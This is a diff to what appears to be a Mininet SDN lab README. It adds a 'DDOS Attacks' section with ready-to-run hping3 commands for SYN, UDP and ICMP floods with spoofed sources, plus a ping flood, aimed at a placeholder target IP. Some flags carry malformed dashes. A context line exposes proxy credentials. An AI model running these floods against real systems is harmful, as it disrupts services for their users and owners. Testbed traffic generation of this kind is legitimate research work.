@@ -69,7 +69,23 @@ Environment="HTTPS_PROXY=https://edcguest:edcguest@172.31.52.51:3128/"
 * sudo mn --controller=remote,ip=172.17.0.2,port=6653 --topo=[ linear|minimal|reversed|single|torus|tree ],10 
 ## cleaning mininet
 * sudo mn -c
-
+## DDOS Attacks
++ ### SYN Flood
+```
+sudo hping3 --rand-source –S –L 0 –p 80 <target IP>
+```
++ ### UDP Flood
+```
+sudo hping3 --rand-source -–udp -p 53 <target IP> --flood
+```
++ ### ICMP Flood
+```
+sudo hping3 --icmp --rand-source <target IP> --flood
+```
++ ### Ping Flood
+```
+sudo ping -f -s 65500 <Target IP>
+```
 ## Other contributors
 * [Chaitanya kumar](https://github.com/Jackson2398)
 * [Aditya Choudary](http://github.com/adityachd123)
